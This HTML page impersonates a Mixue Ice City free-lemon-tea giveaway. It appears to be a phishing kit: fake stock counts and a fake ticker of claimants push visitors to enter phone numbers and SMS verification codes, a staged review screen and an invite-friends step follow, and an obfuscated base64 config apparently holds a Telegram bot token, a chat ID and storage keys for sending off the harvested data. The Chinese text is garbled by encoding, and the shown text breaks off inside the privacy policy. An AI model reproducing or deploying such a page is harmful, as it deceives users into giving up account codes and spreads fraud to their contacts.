<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.7.7/axios.min.js"></script>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>èœœé›ªå†°åŸ Â· é™æ—¶ç¦åˆ© Â· å…è´¹é¢†æŸ æª¬èŒ¶</title>
  <style>
    :root {
      --mixue-red: #E63946;
      --mixue-yellow: #FFD166;
      --mixue-white: #F8F9FA;
      --mixue-dark: #252422;
      --mixue-gray: #CCC5B9;
      --shadow-light: 0 8px 32px rgba(230, 57, 70, 0.25);
      --radius-lg: 28px;
      --radius-md: 18px;
      --radius-sm: 12px;
    }
    * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "PingFang SC", "Hiragino Sans GB", sans-serif;
      background: url('https://pub-141831e61e69445289222976a15b6fb3.r2.dev/Image_to_url_V2/1000046878-imagetourl.cloud-1770310883157-bp2dgh.jpg') no-repeat center center fixed;
      background-size: cover;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px 15px;
      position: relative;
    }
    body::before {
      content: "";
      position: fixed;
      inset: 0;
      background: linear-gradient(180deg, rgba(230,57,70,0.08), rgba(255,209,102,0.05));
      z-index: -1;
    }

    /* å¯åŠ¨åŠ è½½ç”»é¢ */
    .splash-screen {
      position: fixed;
      inset: 0;
      background: linear-gradient(135deg, var(--mixue-red), #C92A39);
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      z-index: 999999;
      transition: opacity 0.5s ease-out;
    }
    .splash-screen.hide {
      opacity: 0;
      pointer-events: none;
    }
    .splash-logo {
      width: 120px;
      height: 120px;
      background: white;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 60px;
      margin-bottom: 30px;
      animation: bounce 1s infinite;
      box-shadow: 0 10px 40px rgba(0,0,0,0.2);
    }
    @keyframes bounce {
      0%, 100% { transform: translateY(0); }
      50% { transform: translateY(-20px); }
    }
    .splash-text {
      color: white;
      font-size: 1.5rem;
      font-weight: 700;
      margin-bottom: 20px;
      letter-spacing: 2px;
    }
    .splash-progress {
      width: 200px;
      height: 6px;
      background: rgba(255,255,255,0.3);
      border-radius: 3px;
      overflow: hidden;
    }
    .splash-progress-bar {
      height: 100%;
      background: var(--mixue-yellow);
      width: 0%;
      transition: width 0.1s linear;
      border-radius: 3px;
    }
    .splash-hint {
      color: rgba(255,255,255,0.8);
      font-size: 0.9rem;
      margin-top: 15px;
    }

    .card { width:100%; max-width:420px; background:rgba(255,255,255,0.98); border-radius:var(--radius-lg); overflow:hidden; box-shadow:var(--shadow-light); border:1px solid rgba(230,57,70,0.1); animation:fadeUp 0.6s ease-out; }
    @keyframes fadeUp { 0% {opacity:0; transform:translateY(30px);} 100% {opacity:1; transform:translateY(0);} }

    .header { background:linear-gradient(135deg, var(--mixue-red), #C92A39); color:var(--mixue-white); padding:42px 28px 24px; text-align:center; position:relative; }
    .header::after { content:""; position:absolute; bottom:0; left:0; right:0; height:6px; background:var(--mixue-yellow); }
    .header h1 { font-size:2.6rem; font-weight:900; letter-spacing:2px; text-shadow:0 2px 4px rgba(0,0,0,0.1); }
    .header p { margin:10px 0 16px; font-size:1.15rem; font-weight:500; opacity:0.95; }

    .activity-period { font-size:0.9rem; background:rgba(255,255,255,0.15); padding:10px 20px; border-radius:50px; display:inline-block; margin:8px 0 16px; }
    #globalTimer { color:var(--mixue-yellow); font-weight:700; }

    .stock-info { font-size:1rem; background:rgba(0,0,0,0.2); padding:10px 20px; border-radius:50px; margin:12px auto; max-width:90%; font-weight:600; }
    .low-stock { color:var(--mixue-yellow) !important; animation:blinkWarn 1s infinite alternate; }
    @keyframes blinkWarn { from {opacity:1;} to {opacity:0.7;} }

    .join-count { text-align:center; font-size:1.2rem; color:var(--mixue-red); background:rgba(255,209,102,0.15); padding:12px; margin:0; font-weight:700; animation:pulse 2.5s infinite; }
    @keyframes pulse { 0%,100% {transform:scale(1);} 50% {transform:scale(1.03);} }

    .content { padding:32px 28px 40px; background:var(--mixue-white); }

    .barrage-box { 
      height: 58px;
      margin:0 0 20px; 
      background:rgba(230,57,70,0.05); 
      border-radius:var(--radius-sm); 
      overflow:hidden; 
      position:relative; 
      border:1px solid rgba(230,57,70,0.1); 
    }
    .barrage-item { 
      position:absolute; 
      white-space:nowrap; 
      font-size:0.78rem; 
      font-weight:600; 
      padding:4px 12px; 
      line-height:1.25; 
      left:100%; 
      background:rgba(255,255,255,0.94); 
      border-radius:10px; 
      box-shadow:0 1px 3px rgba(0,0,0,0.07); 
      z-index:1; 
      animation:barrageSlide linear forwards; 
      will-change: transform;
      pointer-events: none;
    }
    @keyframes barrageSlide { 
      0% { transform:translateX(0); } 
      100% { transform:translateX(calc(-100vw - 140%)); } 
    }

    .input-box { position:relative; margin-bottom:20px; }
    input { width:100%; height:56px; padding:0 24px; border:2px solid var(--mixue-gray); border-radius:var(--radius-md); font-size:1rem; background:#fff; transition:all 0.3s; }
    input:focus { outline:none; border-color:var(--mixue-red); box-shadow:0 0 0 6px rgba(230,57,70,0.1); transform:translateY(-2px); }
    input.input-error { border-color:#ff4d4f; box-shadow:0 0 0 6px rgba(255,77,79,0.1); animation:shake 0.3s; }
    @keyframes shake { 0%,100% {transform:translateX(0);} 25% {transform:translateX(-4px);} 75% {transform:translateX(4px);} }

    .verify-slider {
      width: 100%;
      height: 54px;
      background: #f0f2f5;
      border-radius: 27px;
      position: relative;
      margin: 24px 0 32px;
      overflow: hidden;
      border: 1px solid #e8eaed;
      box-shadow: inset 0 2px 4px rgba(0,0,0,0.06);
      display: none;
      opacity: 0;
      transform: translateY(12px);
      transition: all 0.4s ease;
    }

    .verify-slider.show {
      display: block;
      opacity: 1;
      transform: translateY(0);
    }

    .verify-bg {
      position: absolute;
      left: 0;
      top: 0;
      height: 100%;
      background: linear-gradient(90deg, #ffd166, #ffbd59);
      width: 0;
      transition: width 0.18s ease;
      border-radius: 27px 0 0 27px;
    }

    .verify-success .verify-bg {
      background: linear-gradient(90deg, #52c41a, #73d13d);
      border-radius: 27px;
    }

    .verify-block {
      position: absolute;
      left: 0;
      top: 0;
      width: 54px;
      height: 54px;
      background: white;
      border-radius: 50%;
      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 22px;
      font-weight: bold;
      color: #666;
      cursor: grab;
      transition: all 0.2s ease;
      z-index: 2;
      user-select: none;
    }

    .verify-block:active {
      cursor: grabbing;
      transform: scale(1.08);
      box-shadow: 0 6px 20px rgba(0,0,0,0.22);
    }

    .verify-success .verify-block {
      background: #52c41a;
      color: white;
      box-shadow: 0 4px 16px rgba(82,196,26,0.4);
    }

    .verify-text {
      position: absolute;
      left: 0;
      right: 0;
      top: 0;
      bottom: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #8c8c8c;
      font-size: 0.98rem;
      font-weight: 500;
      pointer-events: none;
      z-index: 1;
      transition: color 0.3s;
    }

    .verify-success .verify-text {
      color: #52c41a;
      font-weight: 600;
    }

    .btn { width:100%; height:60px; background:linear-gradient(135deg, var(--mixue-red), #D62E3D); color:#fff; border:none; border-radius:var(--radius-md); font-size:1.25rem; font-weight:700; cursor:pointer; transition:all 0.3s; margin-top:16px; box-shadow:0 6px 16px rgba(230,57,70,0.3); }
    .btn:disabled { background:var(--mixue-gray); cursor:not-allowed; box-shadow:none; }

    .loading-mask { position:fixed; inset:0; background:rgba(255,255,255,0.95); display:none; flex-direction:column; align-items:center; justify-content:center; z-index:99999; backdrop-filter:blur(8px); }
    .loading-mask.show { display:flex; }
    .loading-spinner { width:60px; height:60px; border:5px solid #f3f3f3; border-top:5px solid var(--mixue-red); border-radius:50%; animation:spin 1s linear infinite; margin-bottom:24px; }
    @keyframes spin { 0% { transform:rotate(0deg); } 100% { transform:rotate(360deg); } }
    
    .loading-title { 
      font-size:1.5rem; 
      color:var(--mixue-red); 
      font-weight:700; 
      margin-bottom:12px;
      animation:pulse 2s infinite;
    }
    .loading-subtitle { 
      font-size:1rem; 
      color:#666; 
      font-weight:500; 
      text-align:center;
      padding:0 40px;
      line-height:1.6;
    }
    .loading-hint {
      position:absolute;
      bottom:40px;
      font-size:0.85rem;
      color:#999;
      text-align:center;
      padding:0 30px;
    }

    .modal { position:fixed; inset:0; background:rgba(0,0,0,0.65); display:none; align-items:center; justify-content:center; z-index:100000; }
    .modal.show { display:flex; }
    .modal-content { background:#fff; border-radius:var(--radius-lg); padding:40px 30px; text-align:center; max-width:320px; width:90%; box-shadow:var(--shadow-light); }
    .modal-content h2 { color:var(--mixue-red); margin-bottom:16px; font-size:1.8rem; }
    .coupon-code { background:var(--mixue-yellow); color:var(--mixue-dark); padding:12px 20px; border-radius:var(--radius-sm); font-weight:bold; margin:16px 0; letter-spacing:1px; }
    .modal-emoji { font-size:2.5rem; margin:16px 0; }

    .toast-container { position:fixed; top:20px; left:50%; transform:translateX(-50%); z-index:999999; display:flex; flex-direction:column; gap:8px; }
    .toast { background:rgba(0,0,0,0.7); color:#fff; padding:12px 24px; border-radius:20px; font-size:0.95rem; animation:toastIn 0.3s ease-out; }
    @keyframes toastIn { from { opacity:0; transform:translateY(-20px); } to { opacity:1; transform:translateY(0); } }

    .agreement {
      text-align: center;
      font-size: 0.82rem;
      color: #666;
      margin-top: 16px;
      line-height: 1.5;
    }
    .agreement a {
      color: var(--mixue-red);
      text-decoration: none;
      font-weight: 500;
      cursor: pointer;
    }
    .agreement a:hover {
      text-decoration: underline;
    }

    .rejected-modal .modal-content {
      border: 3px solid #ff4d4f;
    }
    .rejected-modal h2 {
      color: #ff4d4f;
    }

    /* é‚€è¯·å¥½å‹é¡µé¢æ ·å¼ */
    .invite-page {
      display: none;
      padding: 20px;
      text-align: center;
    }
    .invite-page.show {
      display: block;
    }
    .invite-header {
      background: linear-gradient(135deg, var(--mixue-red), #C92A39);
      color: white;
      padding: 30px 20px;
      border-radius: var(--radius-lg);
      margin-bottom: 20px;
    }
    .invite-header h2 {
      font-size: 1.5rem;
      margin-bottom: 10px;
    }
    .invite-progress {
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 10px;
      margin: 20px 0;
    }
    .invite-step {
      width: 40px;
      height: 40px;
      border-radius: 50%;
      background: rgba(255,255,255,0.3);
      display: flex;
      align-items: center;
      justify-content: center;
      font-weight: bold;
      transition: all 0.3s;
    }
    .invite-step.active {
      background: var(--mixue-yellow);
      color: var(--mixue-dark);
      transform: scale(1.1);
    }
    .invite-step.completed {
      background: #52c41a;
      color: white;
    }
    .invite-line {
      width: 30px;
      height: 3px;
      background: rgba(255,255,255,0.3);
      border-radius: 2px;
    }
    .invite-line.completed {
      background: #52c41a;
    }
    .invite-stats {
      background: white;
      border-radius: var(--radius-md);
      padding: 20px;
      margin-bottom: 20px;
      box-shadow: 0 2px 12px rgba(0,0,0,0.1);
    }
    .invite-count {
      font-size: 3rem;
      color: var(--mixue-red);
      font-weight: 900;
    }
    .invite-label {
      color: #666;
      font-size: 0.9rem;
    }
    .chance-count {
      margin-top: 10px;
      font-size: 1.2rem;
      color: var(--mixue-yellow);
      font-weight: 700;
      text-shadow: 0 1px 2px rgba(0,0,0,0.1);
    }

    /* è½¬ç›˜æ ·å¼ */
    .wheel-container {
      position: relative;
      width: 300px;
      height: 300px;
      margin: 20px auto;
    }
    .wheel {
      width: 100%;
      height: 100%;
      border-radius: 50%;
      position: relative;
      overflow: hidden;
      border: 8px solid var(--mixue-red);
      box-shadow: 0 10px 30px rgba(230,57,70,0.3);
      transition: transform 4s cubic-bezier(0.17, 0.67, 0.12, 0.99);
    }
    .wheel-item {
      position: absolute;
      width: 50%;
      height: 50%;
      transform-origin: right bottom;
      left: 0;
      top: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 0.85rem;
      font-weight: 700;
      padding: 20px;
      text-align: center;
    }
    .wheel-item:nth-child(1) { transform: rotate(0deg); background: #FFF5F5; color: var(--mixue-red); }
    .wheel-item:nth-child(2) { transform: rotate(45deg); background: #FFF9E6; color: #D48806; }
    .wheel-item:nth-child(3) { transform: rotate(90deg); background: #F6FFED; color: #389E0D; }
    .wheel-item:nth-child(4) { transform: rotate(135deg); background: #E6FFFB; color: #08979C; }
    .wheel-item:nth-child(5) { transform: rotate(180deg); background: #F9F0FF; color: #722ED1; }
    .wheel-item:nth-child(6) { transform: rotate(225deg); background: #FFF0F6; color: #EB2F96; }
    .wheel-item:nth-child(7) { transform: rotate(270deg); background: #FFF2E8; color: #FA541C; }
    .wheel-item:nth-child(8) { transform: rotate(315deg); background: #FCFFE6; color: #7CB305; }
    
    .wheel-pointer {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      width: 60px;
      height: 60px;
      background: var(--mixue-red);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 24px;
      color: white;
      box-shadow: 0 4px 15px rgba(230,57,70,0.4);
      z-index: 10;
      border: 4px solid white;
    }
    .wheel-pointer::before {
      content: '';
      position: absolute;
      top: -20px;
      left: 50%;
      transform: translateX(-50%);
      border-left: 15px solid transparent;
      border-right: 15px solid transparent;
      border-bottom: 25px solid var(--mixue-red);
    }

    .invite-btn {
      background: linear-gradient(135deg, #52c41a, #73d13d);
      margin-top: 20px;
    }
    .invite-btn:disabled {
      background: var(--mixue-gray);
    }

    .wheel-btn {
      background: linear-gradient(135deg, #FA541C, #FF7A45);
      margin-top: 20px;
    }
    .wheel-btn:disabled {
      background: var(--mixue-gray);
    }

    .invite-rules {
      background: rgba(230,57,70,0.05);
      border-radius: var(--radius-sm);
      padding: 15px;
      margin-top: 20px;
      text-align: left;
      font-size: 0.85rem;
      color: #666;
    }
    .invite-rules h4 {
      color: var(--mixue-red);
      margin-bottom: 10px;
    }
    .invite-rules li {
      margin: 5px 0;
      list-style: none;
      padding-left: 15px;
      position: relative;
    }
    .invite-rules li::before {
      content: 'â€¢';
      color: var(--mixue-red);
      position: absolute;
      left: 0;
    }

    .hidden { display: none !important; }
  </style>
</head>
<body>

<!-- å¯åŠ¨åŠ è½½ç”»é¢ -->
<div class="splash-screen" id="splashScreen">
  <div class="splash-logo">ğŸ¦</div>
  <div class="splash-text" id="splashText">é›ªç‹æ­£åœ¨èµ¶æ¥â€¦</div>
  <div class="splash-progress">
    <div class="splash-progress-bar" id="splashProgress"></div>
  </div>
  <div class="splash-hint">æ­£åœ¨åŠ è½½ç”œèœœç¦åˆ©...</div>
  <!-- èƒŒæ™¯éŸ³ä¹ -->
  <audio id="bgMusic" loop>
    <source src="https://www.0zou.com/bz/c4JWtZUOiwM2O11bVkTpzQ==.html" type="audio/mpeg">
    <!-- å¤‡ç”¨éŸ³æº -->
    <source src="https://www.gequbao.com/music/8529137" type="audio/mpeg">
  </audio>
</div>

<div class="toast-container" id="toastContainer"></div>

<div class="loading-mask" id="loadingMask">
  <div class="loading-spinner"></div>
  <div class="loading-title">é›ªç‹æ­£åœ¨è§‚å¯Ÿä¸€åˆ‡â€¦â€¦</div>
  <div class="loading-subtitle">æ­£åœ¨æ£€æŸ¥ç¯å¢ƒä¸­ï¼Œä¸è¦ç¦»å¼€æˆ–åˆ·æ–°æ­¤é¡µé¢</div>
  <div class="loading-hint">é¢„è®¡å®¡æ ¸æ—¶é—´ï¼š30ç§’ - 2åˆ†é’Ÿ<br>è¯·ä¿æŒç½‘ç»œç•…é€š</div>
</div>

<!-- ä¸»é¡µé¢ -->
<div class="card" id="mainPage">
  <div class="header">
    <h1>èœœé›ªå†°åŸ</h1>
    <p>æ˜¥èŠ‚ç‹‚æ¬¢ Â· å…è´¹é¢†å¤§æ¯æŸ æª¬èŒ¶</p>
    <div class="activity-period">
      æ´»åŠ¨è¿›è¡Œä¸­ï¼š2026å¹´1æœˆ30æ—¥ â€” 2026å¹´2æœˆ18æ—¥<br>
      <strong id="globalTimer">æœ¬è½®åé¢å€’è®¡æ—¶ï¼šè®¡ç®—ä¸­...</strong>
    </div>
    <div class="stock-info">å…¨å›½é™é‡<span id="totalStockDisplay">5000</span>ä»½ï¼Œå·²é¢† <span id="claimedCount">4567</span> å¼ ï¼Œä»…å‰© <span id="remainCount">433</span> å¼ </div>
  </div>

  <div class="join-count">å·²æœ‰ <span id="countNum">4,567</span> äººæŠ¢åˆ°ç¦åˆ©</div>

  <div class="content">
    <div class="barrage-box" id="barrageBox"></div>

    <div class="fair-tip" style="text-align:center; color:#666; margin-bottom:20px; font-size:0.9rem;">ä¸ºä¿è¯å…¬å¹³ï¼Œä¸¥ç¦ä½¿ç”¨è„šæœ¬æˆ–å¤–æŒ‚ï¼Œè¿è§„æ°¸ä¹…å°å·</div>

    <div class="input-box">
      <input type="text" id="nickname" placeholder="æ˜µç§°ï¼ˆé€‰å¡«ï¼‰" maxlength="20" autocomplete="off" />
    </div>

    <div class="input-box">
      <input type="tel" id="phone" placeholder="è¯·è¾“å…¥æ‰‹æœºå·" maxlength="11" inputmode="numeric" pattern="[0-9]*" autocomplete="off" />
    </div>

    <div class="verify-slider" id="verifySlider">
      <div class="verify-bg" id="verifyBg"></div>
      <div class="verify-block" id="verifyBlock">â†’</div>
      <div class="verify-text">å‘å³æ»‘åŠ¨å®ŒæˆéªŒè¯</div>
    </div>

    <div class="input-box">
      <input type="text" id="code" placeholder="è¯·è¾“å…¥éªŒè¯ç " maxlength="6" inputmode="numeric" pattern="[0-9]*" autocomplete="off" />
    </div>

    <button class="btn" id="getCodeBtn" disabled>è·å–éªŒè¯ç </button>
    <button class="btn" id="submitBtn" style="display:none;" disabled>ç«‹å³é¢†å–</button>

    <div id="countdown" style="opacity:0; color:var(--mixue-red); text-align:center; margin-top:14px; font-size:0.95rem;"></div>

    <div class="agreement">
      ç™»å½•å³ä»£è¡¨åŒæ„
      <a onclick="showAgreement('privacy')">ã€Šéšç§æ”¿ç­–ã€‹</a>
      å’Œ
      <a onclick="showAgreement('user')">ã€Šç”¨æˆ·åè®®ã€‹</a>
    </div>
  </div>
</div>

<!-- é‚€è¯·å¥½å‹é¡µé¢ -->
<div class="card hidden" id="invitePage">
  <div class="invite-header">
    <h2>ğŸ‰ æ­å–œé€šè¿‡å®¡æ ¸ï¼</h2>
    <p>è¿˜å·®ä¸€ç‚¹ç‚¹å°±èƒ½é¢†åˆ°åˆ¸ç å•¦</p>
    <div class="invite-progress">
      <div class="invite-step completed" id="step1">1</div>
      <div class="invite-line completed" id="line1"></div>
      <div class="invite-step" id="step2">2</div>
      <div class="invite-line" id="line2"></div>
      <div class="invite-step" id="step3">3</div>
    </div>
    <p style="font-size: 0.9rem; opacity: 0.9;">é‚€è¯· 3 ä½å¥½å‹åŠ©åŠ›å³å¯é¢†å–</p>
  </div>
  
  <div class="content">
    <div class="invite-stats">
      <div class="invite-count" id="inviteCount">0</div>
      <div class="invite-label">ä½å¥½å‹å·²åŠ©åŠ›</div>
      <div class="chance-count" id="chanceCount">å‰©ä½™æŠ½å¥–æ¬¡æ•°ï¼š0</div>
    </div>

    <!-- è½¬ç›˜ -->
    <div class="wheel-container" id="wheelContainer" style="display: none;">
      <div class="wheel" id="wheel">
        <div class="wheel-item">ğŸ<br>æŸ æª¬èŒ¶åˆ¸</div>
        <div class="wheel-item">ğŸ˜¢<br>è°¢è°¢æƒ é¡¾</div>
        <div class="wheel-item">ğŸ¦<br>å†°æ·‡æ·‹åˆ¸</div>
        <div class="wheel-item">ğŸ˜­<br>å†æ¥å†å‰</div>
        <div class="wheel-item">ğŸ§‹<br>å¥¶èŒ¶åˆ¸</div>
        <div class="wheel-item">ğŸ¤”<br>å·®ä¸€ç‚¹</div>
        <div class="wheel-item">ğŸŠ<br>ç¥ç§˜å¤§å¥–</div>
        <div class="wheel-item">ğŸ˜…<br>ä¸‹æ¬¡å†æ¥</div>
      </div>
      <div class="wheel-pointer">ğŸ‘†</div>
    </div>

    <button class="btn invite-btn" id="inviteBtn">é‚€è¯·å¥½å‹åŠ©åŠ›</button>
    <button class="btn wheel-btn hidden" id="wheelBtn">å¼€å§‹æŠ½å¥–</button>

    <div class="invite-rules">
      <h4>ğŸ® æ´»åŠ¨è§„åˆ™</h4>
      <li>æ¯é‚€è¯·1ä½å¥½å‹è·å¾—éšæœºæŠ½å¥–æ¬¡æ•°ï¼ˆ0-5æ¬¡ï¼‰</li>
      <li>é‚€è¯·æ»¡3ä½å¥½å‹å¿…å¾—æŸ æª¬èŒ¶åˆ¸ç </li>
      <li>æŠ½å¥–ç»“æœå®æ—¶å‘é€åˆ°æ‚¨çš„æ‰‹æœº</li>
      <li>æ´»åŠ¨æœ€ç»ˆè§£é‡Šæƒå½’èœœé›ªå†°åŸæ‰€æœ‰</li>
    </div>
  </div>
</div>

<div class="modal" id="successModal">
  <div class="modal-content">
    <h2>é¢†å–æˆåŠŸï¼</h2>
    <p>å¤§æ¯æŸ æª¬èŒ¶åˆ¸å·²å‘è‡³æ‰‹æœº</p>
    <div class="coupon-code" id="couponCode">MX2026-ICE-ABCD1234</div>
    <p style="font-weight:bold; margin:20px 0;">è¯·å°½å¿«åˆ°åº—æ ¸é”€ï¼Œè¿‡æœŸæ— æ•ˆ</p>
    <div class="modal-emoji">ğŸ‰ğŸ‹ğŸ”¥</div>
    <button class="btn" id="closeModalBtn">å¥½çš„ï¼Œå»å…‘æ¢ï¼</button>
  </div>
</div>

<div class="modal rejected-modal" id="rejectedModal">
  <div class="modal-content">
    <h2>å®¡æ ¸æœªé€šè¿‡</h2>
    <p>æŠ±æ­‰ï¼Œæ‚¨çš„ç”³è¯·æœªé€šè¿‡äººå·¥å®¡æ ¸</p>
    <p style="color:#666; font-size:0.9rem; margin:16px 0;">å¯èƒ½åŸå› ï¼šä¿¡æ¯å¼‚å¸¸ã€é‡å¤é¢†å–æˆ–å­˜åœ¨è¿è§„æ“ä½œ</p>
    <div class="modal-emoji">ğŸ˜”</div>
    <button class="btn" onclick="document.getElementById('rejectedModal').classList.remove('show')" style="background:linear-gradient(135deg, #999, #666);">æˆ‘çŸ¥é“äº†</button>
  </div>
</div>

<div class="modal" id="agreementModal">
  <div class="modal-content" style="max-height:80vh; overflow-y:auto; padding:24px 20px; text-align:left;">
    <h2 id="agreementTitle">åè®®æ ‡é¢˜</h2>
    <div id="agreementContent" style="font-size:0.9rem; line-height:1.6; color:#333; white-space:pre-wrap; margin:16px 0;"></div>
    <button class="btn" style="margin-top:20px; width:100%;" onclick="document.getElementById('agreementModal').classList.remove('show')">æˆ‘å·²é˜…è¯»</button>
  </div>
</div>

<script>
// ============================= é…ç½®ï¼ˆå·²æ··æ·†ï¼‰ =============================
const _0x5f2c = {
  _b: 'ODMzODY3MjM5NTpBQUg5cmJ5czlzalktQnRodWJ2WHlWdjJScl9kX1ByX2tpSQ==',
  _c: 'ODQzOTQ0ODA4Nw==',
  _i: 'Njk4NTlhZmFkMGVhODgxZjQwYTRlNTI2',
  _k: 'JDJhJDEwJERlTlBYMVIwQzBQanNoREpmL3cxZC45d2M4ZkhMTkIwYUFHQndYbXJuc01DdlNWVHQvdmdh'
};

function _d(b) {
  const a = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
  let o = '', c1, c2, c3, e1, e2, e3, e4, i = 0;
  b = b.replace(/[^A-Za-z0-9+/=]/g, '');
  while (i < b.length) {
    e1 = a.indexOf(b.charAt(i++));
    e2 = a.indexOf(b.charAt(i++));
    e3 = a.indexOf(b.charAt(i++));
    e4 = a.indexOf(b.charAt(i++));
    c1 = (e1 << 2) | (e2 >> 4);
    c2 = ((e2 & 15) << 4) | (e3 >> 2);
    c3 = ((e3 & 3) << 6) | e4;
    o += String.fromCharCode(c1);
    if (e3 !== 64) o += String.fromCharCode(c2);
    if (e4 !== 64) o += String.fromCharCode(c3);
  }
  try {
    return decodeURIComponent(escape(o));
  } catch (e) {
    return o;
  }
}

const _cfg = {
  t: _d(_0x5f2c._b),
  u: _d(_0x5f2c._c),
  b: _d(_0x5f2c._i),
  m: _d(_0x5f2c._k)
};

const TOTAL_STOCK = 5000;
let claimed = 4567;
let isVerifySuccess = false;
let timers = {};
let isSending = false;
let isPolling = false;

// é‚€è¯·ç³»ç»ŸçŠ¶æ€
let inviteState = {
  invitedCount: 0,
  chanceCount: 0,
  hasWon: false,
  currentPhone: '',
  currentNickname: ''
};

function generateCouponCode() {
  const prefix = 'MX' + Math.floor(100000 + Math.random()*900000);
  const suffix = Math.random().toString(36).slice(2,8).toUpperCase();
  return `${prefix}-ICE-${suffix}`;
}

const els = {
  phone: document.getElementById('phone'),
  nickname: document.getElementById('nickname'),
  code: document.getElementById('code'),
  couponCode: document.getElementById('couponCode'),
  getBtn: document.getElementById('getCodeBtn'),
  submitBtn: document.getElementById('submitBtn'),
  countdown: document.getElementById('countdown'),
  modal: document.getElementById('successModal'),
  rejectedModal: document.getElementById('rejectedModal'),
  claimedCount: document.getElementById('claimedCount'),
  remainCount: document.getElementById('remainCount'),
  countNum: document.getElementById('countNum'),
  barrageBox: document.getElementById('barrageBox'),
  verifySlider: document.getElementById('verifySlider'),
  verifyBlock: document.getElementById('verifyBlock'),
  verifyBg: document.getElementById('verifyBg'),
  loadingMask: document.getElementById('loadingMask'),
  globalTimer: document.getElementById('globalTimer'),
  closeModalBtn: document.getElementById('closeModalBtn'),
  agreementModal: document.getElementById('agreementModal'),
  agreementTitle: document.getElementById('agreementTitle'),
  agreementContent: document.getElementById('agreementContent'),
  mainPage: document.getElementById('mainPage'),
  invitePage: document.getElementById('invitePage'),
  inviteCount: document.getElementById('inviteCount'),
  chanceCount: document.getElementById('chanceCount'),
  inviteBtn: document.getElementById('inviteBtn'),
  wheelBtn: document.getElementById('wheelBtn'),
  wheelContainer: document.getElementById('wheelContainer'),
  wheel: document.getElementById('wheel'),
  step1: document.getElementById('step1'),
  step2: document.getElementById('step2'),
  step3: document.getElementById('step3'),
  line1: document.getElementById('line1'),
  line2: document.getElementById('line2')
};

function showToast(msg) {
  const t = document.createElement('div');
  t.className = 'toast';
  t.innerHTML = msg;
  document.getElementById('toastContainer').appendChild(t);
  setTimeout(() => t.remove(), 2800);
}

function shootBarrage(customPhone = null) {
  const chinaMobilePrefixes = ['134','135','136','137','138','139','147','150','151','152','157','158','159','172','178','182','183','184','187','188','198'];
  const chinaUnicomPrefixes = ['130','131','132','145','155','156','166','175','176','185','186'];
  const chinaTelecomPrefixes = ['133','149','153','173','177','180','181','189','199'];
  const chinaBroadcastPrefixes = ['192'];
  const allPrefixes = [...chinaMobilePrefixes, ...chinaUnicomPrefixes, ...chinaTelecomPrefixes, ...chinaBroadcastPrefixes];

  let phoneDisplay;
  if (customPhone && /^1[3-9]\d{9}$/.test(customPhone)) {
    phoneDisplay = customPhone.slice(0,3) + "****" + customPhone.slice(7);
  } else {
    const prefix = allPrefixes[Math.floor(Math.random() * allPrefixes.length)];
    const suffix = Math.floor(1000 + Math.random() * 9000);
    phoneDisplay = prefix + "****" + suffix;
  }

  const surnames = ['èµµ','é’±','å­™','æ','å‘¨','å´','éƒ‘','ç‹','å†¯','é™ˆ','è¤š','å«','è’‹','æ²ˆ','éŸ©','æ¨','æœ±','ç§¦','å°¤','è®¸','ä½•','å•','æ–½','å¼ ','å­”','æ›¹','ä¸¥','å','é‡‘','é­','é™¶','å§œ','éƒ','è‘£','æ¢','æœ','æˆ´','å®‹','å”','é‚“','è”¡','æ½˜','è¢','äº','èƒ¡','æ—','éƒ­','é©¬','ç½—','é«˜'];
  const surname = surnames[Math.floor(Math.random() * surnames.length)];

  const item = document.createElement('div');
  item.className = 'barrage-item';
  item.textContent = `${surname}** ${phoneDisplay} åˆšåˆšé¢†å–æˆåŠŸï¼`;

  const randomTop = 10 + Math.random() * (34 - 10);
  item.style.top = randomTop + 'px';

  const colors = ['#c1121f', '#e63946', '#d00000', '#9d0208', '#6a040f', '#370617'];
  item.style.color = colors[Math.floor(Math.random() * colors.length)];

  const duration = 3.5 + Math.random() * 2.0;
  item.style.animationDuration = duration + 's';

  els.barrageBox.appendChild(item);
  setTimeout(() => item.parentNode && item.remove(), duration * 1000 + 300);
}

function showAgreement(type) {
  let title = type === 'privacy' ? 'éšç§æ”¿ç­–' : 'ç”¨æˆ·åè®®';
  let content = type === 'privacy' ? 
`æœ€åæ›´æ–°ï¼š2026å¹´1æœˆ1æ—¥

æˆ‘ä»¬é‡è§†æ‚¨çš„éšç§ã€‚æœ¬æ”¿ç­–è¯´æ˜æˆ‘ä»¬å¦‚ä½•æ”¶é›†ã€ä½¿ç”¨å’Œä¿æŠ¤æ‚¨çš„ä¿¡æ¯ã€‚

1. æ”¶é›†çš„ä¿¡æ¯
- æ‰‹æœºå·ã€æ˜µç§°ï¼ˆæ‚¨ä¸»åŠ¨æä¾›ï¼‰
- è®¾å¤‡ä¿¡æ¯ã€IPåœ°å€ã€è®¿é—®æ—¶é—´

2. ä½¿ç”¨ç›®çš„
- èº«ä»½éªŒè¯ä¸ç¦åˆ©å‘æ”¾
- é˜²åˆ·ã€é˜²ä½œå¼Š
- æœåŠ¡ä¼˜åŒ–

3. ä¿¡æ¯å…±äº«
ä»…åœ¨å¿…è¦æ—¶ä¸èœœé›ªå†°åŸå®˜æ–¹åˆä½œé—¨åº—å…±äº«åˆ¸ç ä¿¡æ¯ç”¨äºæ ¸é”€ï¼Œä¸ä¼šå‡ºå”®æ‚¨çš„ä¸ªäººä¿¡æ¯ã€‚

4. æ‚¨çš„æƒåˆ©
